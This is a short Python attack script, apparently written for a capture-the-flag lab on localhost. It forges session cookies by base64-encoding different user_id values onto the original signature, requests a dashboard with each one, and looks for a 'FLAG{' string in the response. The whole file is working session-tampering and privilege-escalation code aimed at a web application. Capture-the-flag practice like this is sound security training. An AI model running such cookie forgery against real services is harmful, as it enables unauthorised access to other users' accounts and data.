import requests, json

url = "http://127.0.0.1:33187/dashboard"
cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"

print("Testing session cookie manipulation...")
print(f"Target: {url}")
print(f"Testing user_id range: 10000-10100")
print()

# Test small subset first
for uid in [10032, 10000, 10050, 10100]:
    try:
        import base64
        payload = json.dumps({"user_id": str(uid)})
        encoded = base64.b64encode(payload.encode()).decode().rstrip('=')
        modified_cookie = encoded + ".aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"
        
        resp = requests.get(url, cookies={'session': modified_cookie}, timeout=20)
        print(f"user_id={uid}: Status {resp.status_code}, Size {len(resp.text)}B")
        
        if "FLAG{" in resp.text:
            print(f"  FLAG FOUND in response!")
            
    except Exception as e:
        print(f"user_id={uid}: Error - {str(e)[:50]}")

print("\nTest complete")
